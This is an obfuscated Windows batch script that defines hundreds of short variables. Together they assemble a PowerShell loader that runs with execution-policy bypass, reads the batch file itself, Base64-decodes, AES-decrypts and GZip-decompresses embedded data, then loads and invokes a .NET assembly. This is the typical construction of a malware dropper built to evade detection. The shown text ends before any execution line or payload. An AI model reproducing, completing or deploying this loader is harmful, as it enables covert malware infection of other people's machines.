@echo off
set "cMkptSySTc=in"
set "CqyEUjIztM= /"
set "xidREZHieF=he"
set "bjDxsLnhvu=po"
set "StziMkzCjy=we"
set "YtzlwwsoyN=we"
set "qATPcJWrFg=rs"
set "EgSuwpisPi=ll"
set "jkGwqRonPp=1."
set "YDnKsFMuIv=:\"
set "ZlGlrCSZFK=Sy"
set "PWBoXJpHEN=xe"
set "Nddzrxlsoy=32"
set "lcWScApNvI=.e"
set "InVKhIVkKp=s\"
set "GVdjuaTOgy=Po"
set "ISDFbglbft=ow"
set "cRTiWoUeYp=do"
set "BvLnfInOPr=nd"
set "IIACtKFgrt=0\"
set "sAalzLHOzZ=co"
set "RJmmwicOlT= C"
set "rXEqMkFiav=st"
set "olwvcKIFXW=\W"
set "djObBgiRia=Wi"
set "rwTYQcoukF=\v"
set "ufYAqENIfK=ll"
set "igfmwhOKNW=he"
set "AECwUumkOd=y "
set "JyLxZvHDfk=py"
set "YnUBhJKrMH=ws"
set "QDGIYPRIiJ=rS"
set "VgMOroAagw=em"
set "ImYWrBDLnM=cd"
set "OOViuTouMC= %~dp0"
set "FXKHAsgcNZ=ion."
set "ShPDtgzoow=Stre"
set "dQcJBLyhLm=$qNy"
set "HyICjnKDAj=$inL"
set "LfipOPEDnI=)($d"
set "WoTqZDCeSg= New"
set "FDVmmLzjpQ=hg.T"
set "VFzkagExXQ=3); "
set "IrkfqVIYbo=)) {"
set "DzcfepglGP=($dk"
set "TjfzlJsGNg=bjec"
set "eKjekvlOhN=le  "
set "nrcfPKruKj=m.Re"
set "dROTwBrKVv='[-1"
set "ejIGXlMybw=inLl"
set "CVIvchHEQt=ment"
set "Poccmxzjyz=lit("
set "izGmvHPrxk=pose"
set "PIGitfebEO=nirt"
set "BtIMYWUlqQ=FTph"
set "rhfnrgrgNW= if "
set "aCowqIyHuI=oin "
set "HMLXldkAZP=7;$Q"
set "vxRqDBtkXP=NFhg"
set "NJMSSbqkBf=..-1"
set "LpAlRSwlyo=B) {"
set "hBNGfZLoVo=ress"
set "zzcGWcGteE=L4Yi"
set "kHDOfZmimS=ck($"
set "KZieEXNXYU=ptor"
set "PCXpPXWpUr=, (,"
set "YwRLNyJtng=ring"
set "BMBMPxKuqz=ose("
set "olpvXehGsd=ne);"
set "rauDDcAnHs=LHK."
set "TZInCNyEsW=rity"
set "LPigJywNmR=.Len"
set "sUMXgzrWng=::De"
set "ShaCPFFLgP=comm"
set "WPIRSSxZQd===')"
set "XUYvMlPpIg=ct S"
set "QvLTsqYtqA=[Sys"
set "mEYWvByLaq=stem"
set "gyhcjInutA=DvBX"
set "YPHiegMYjC=k = "
set "hZfRuZpGfb=esMa"
set "IoFAgmWFtK=bstr"
set "PflBjzWvyN=);$Q"
set "EppDKzpnSP=-joi"
set "ydbhEmBhZT=inLl"
set "plGSvjaayz=);$f"
set "QhnNdADzWU== $Q"
set "WHqIhhtWsx=.Com"
set "GCyHWySROp=raph"
set "EAUAaKGAYM=.Sec"
set "JFCdlpDYiS= '')"
set "mnHuvcbyhz=  $d"
set "qNCeMyZcvq=QYnx"
set "CuopniGpHn=ateD"
set "IruBNGTGfp=ew-O"
set "qmqONbdwUA=PxEW"
set "CZtlqIGWnm=nB ="
set "oULpRUcRbH= = $"
set "assqFtCfzp=oryS"
set "YVuSEEDzDN=e = "
set "vWNMLZcSza=yste"
set "IbdwfFqgST=, $i"
set "yZaKjGqnLz=gth)"
set "wLWnWyhZPU=Ynxb"
set "ciLQPlyeqm=[Sys"
set "zrpAhBhfpJ=pher"
set "wEeuXbdZlP=grap"
set "fYtVCjXYum=tryP"
set "daVGYsxbPb=ddin"
set "LODkyKzxEt=Star"
set "IMvMHdjzej=Bmor"
set "YVRdUIodiN=Invo"
set "fxiWrhZczP=in $"
set "IPOHwZRZYe=;$Xt"
set "LkQebomXAv=BC;$"
set "GdFiWQIaxb=New-"
set "esUijujeAy=$fNF"
set "rWcbqTeQZZ=m(, "
set "wgvJhNCQtX=join"
set "GquVmeKXTd=$QYn"
set "zaAMWyAWXU=daeR"
set "kzQjXeWhpS=-nop"
set "BmzTLHhFQX=em.I"
set "RoTahwCfQn=File"
set "VSwOZJqhMs=$inL"
set "dcnJPDPjnH=1] -"
set "ddjHDsjODL=$XtL"
set "rOWurXNCGv=l5E7"
set "xPiCximegk=PTtG"
set "TGrkaSnooq=zuZI"
set "nhNGAFUERP==');"
set "VAyoPSammO=nLlV"
set "GzuMuxQdPt=.Cry"
set "BIQolVfEUV=esaB"
set "pTdKOmjcQR=;$bs"
set "mOgaVnJyKl='[-1"
set "bVZmCaEkQQ=Syst"
set "azftgSjrug=ptog"
set "tdKoPuZecq=.Cry"
set "vbhpGxITcH=S46e"
set "BrEFsWVqgQ=morF"
set "AkMnDVxUPi=v.En"
set "LMkQCnAmhB=V, 0"
set "ntlpXDYhpm=Comp"
set "iHhZQTGZYl=:('g"
set "fRbMBHpbnH=rity"
set "TOtOadiyMW=;$jZ"
set "ahnkEfrvID=k; }"
set "guJgAGDiBL=ewLi"
set "STmHYYkdvU=onve"
set "CaiKmOrpFV=lV ="
set "mJvOlRoNMn=join"
set "tnejyQfCkC=Comp"
set "KlNrOhkfHA=Obje"
set "LrMDGLruZZ=zHhH"
set "jHytSeserP=1..-"
set "IHfnjswBzu=tS46"
set "jhCvvuvrGK=raph"
set "KyPEkzJowP=vert"
set "AbvSfkkiWH=f.Su"
set "XrEoWzXDej=oArr"
set "BSaCqxwCEv=gjYA"
set "McdGpzuxDF=am;$"
set "CogRpdaMPW=Mode"
set "ybLnsjOqCc=();$"
set "PpgFUTSLtE=eam("
set "RFSpnWNfoP=nage"
set "KgvJLcOuzZ=; };"
set "vnbnSsPBwG=flec"
set "ViVnJNPSiQ=106u"
set "QGzcRRsvMx=bypa"
set "ffqPBqdzVn=6] -"
set "wYfjgEEvkL=Ynxb"
set "ZoeOQknVaK=;$bs"
set "ZrICMGfDjo=Syst"
set "lsDeWPWWey=shf."
set "aQIxbXnYEf=y.Pa"
set "kCHNrIzAbx=s75K"
set "nCBCIXhTmg=O.Me"
set "bzmyQNPdgB=null"
set "lGUJhSFMNr= '')"
set "QCSWMMejvL=.Mem"
set "MsgOydecgU=t Sy"
set "jucplBACsm=:: '"
set "eCMFxdgLvN=.Ass"
set "Nvobiafhqc=yste"
set "icKzTCGThK=.Dis"
set "oikZyRggRh=.Cop"
set "eIEwPkMmQe=saBm"
set "kBNCDkZHVp=);$Q"
set "vpKDJWjnjJ=('%*'"
set "qqRkpAykwL=Obje"
set "KWldprFKbW=yste"
set "bJxsMhTSnG=m.IO"
set "DhTNKUgXmf=V = "
set "rDBTIprAIy=rofi"
set "vKGcQbEfdT=('%~f0'"
set "BvHDTVhbdH=]::N"
set "bQcyjsLVuf=$fNF"
set "rvjWbhASts=[-1."
set "DRvUnAqBgs=Gc.T"
set "uiQlxGMctE== [S"
set "IcGtNglFXM=ispo"
set "lrnQeApLZC=ss -"
set "lNWrghdktj=.-16"
set "vONhdjqdKA=WGc "
set "uOVyaKXKxX=.Con"
set "pGppAbnqtw='gni"
set "uYZpQbHtJQ=[Sys"
set "ZbVdPCdyfo=-4] "
set "koVBUuwroO=rans"
set "kXUdJOZJFB=ZQyX"
set "legIqWRdOS=oL'["
set "Nfqwdnkqos=.Key"
set "UrSDYSlkyB=ptog"
set "IvQLyzZLHT=eMVs"
set "ULajvpbPOZ= = N"
set "pEZcpWMHUi=dksh"
set "FiyxPkicTO=)($i"
set "yXGhylAoSv=gMod"
set "fLHSOuUcgr=xb.I"
set "EdGQkLzqUG=Ynxb"
set "lOtBwSnZXN=ose("
set "YIyspjRHsi=e]::"
set "pyAQueqrZM=$fNF"
set "MxTjYnSdCS=.Mod"
set "uIrMPHYSDd=$bsW"
set "KTSySDoNcW='')("
set "DpWjfMFtJo='txe"
set "EXMyIykgms=and "
set "OmjgdloyCn=);$K"
set "prskiwUXkX=embl"
set "RcmuGSvkNh=g = "
set "wWuqSfFGhF=ode]"
set "TsXzWfHYwR=nLlV"
set "AFMTnalGBZ=;$FT"
set "GqPborEEVy=ke($"
set "yARETzkHHI=CFxo"
set "mRkjVNcptX=m.IO"
set "pulxNAcPUr=b.Pa"
set "HiPTEByusF=pStr"
set "YEFmHvSWRq=form"
set "ZQbulBctYk=[Env"
set "JdGjObpyzc=TllA"
set "tSkAwkWYkF=] -j"
set "kjDxPHncKe=RmAx"
set "EuKZkCzeMm=ing("
set "MiwojiNHqM=).Sp"
set "xKsQRpXMjN=pres"
set "KRyzfMDQZc=Conv"
set "NtBerwudtT=Ynxb"
set "KgwDJGQOoz=Disp"
set "XMoTeTAwQP=('da"
set "GLOaKhxqzE=('Tg"
set "cLXPMSLtOj=-ep "
set "krSigTnVaM=HK, "
set "lGoWTnEOiG= [Sy"
set "JgyNbkJlLc=gnir"
set "hyaUnEEAiZ=.IO."
set "BXRPdCwoTX=em.C"
set "eJomgZJYqG=);$j"
set "UfBEmffFTa=.GZi"
set "WmMvnzlJzR='0Pg"
set "WSupPibBNJ=.Cre"
set "iCTbvWANfi=Disp"
set "hJYeWtAMMo=]::("
set "upzIxWuVBj=ct S"
set "wicTBDaMkO=QyX."
set "OcaYsmFknG=yTo("
set "WTSPuhlwvs=();$"
set "upUJETsVIt=DvBX"
set "pdMRWiPOzt=($dk"
set "sZhZdTHTDD=ect "
set "uvOrNKOQQI=16] "
set "JDvFnHFqHP=d;$Q"
set "ojnWpyMEgR=tion"
set "FOtXikRwnz=lV);"
set "WSWIfQpheN=oint"
set "aeEuYDlkLp=V = "
set "OBNORpvfUb=Secu"
set "buQRwWocPe=bk.D"
set "RjwBEdcPpV=..-1"
set "cHbwQKKVtc=XtLH"
set "dudhaWaRdD=ert]"
set "lxdirpSVfu=tem."
set "sKQGvyxXzb=ress"
set "marXNjsfEc=n ''"
set "bXmuzmhQQV=Secu"
set "sJidWYblpK=]::("
set "xgGyeeqvAq=stem"
set "noatPTTXMG=WGc."
set "NAJZOHRexI=shf "
set "SkolXLGRCc=6esa"
set "rlfjeaxgEG=orF'"
set "BdnuHddfPr=y]::"
set "FYpAGPygkI=]::C"
set "nUUYTiJKgy=Fina"
set "SkWGXesAmq=[]] "
set "pjyGzbfqad=stem"
set "AqKgzbZyWc=brea"
set "NzIAqBAURg=tem."
set "nUFxPgvqZj=dj0C"
set "PiPtguVavw= [Sy"
set "tHQvaFckHl=hg);"
set "RyOcNmWAgm= = ["
set "ECbJSgUkhl=YxVw"
set "bHDAJwrGuU=-Obj"
set "JAQSiBMnDs=.Dis"
set "zPrqSsRwwi=comp"
set "iaqcaLyGOh= = $"
set "ncOAUFMIFI=ddin"
set "xBfrdlJmHZ=tem."
set "VfFOutTrLw=ress"
set "yFKwJnwGJF=trea"
set "TKsQPMaIIn=hy.A"
set "eKXhUEZVJt=[IO."
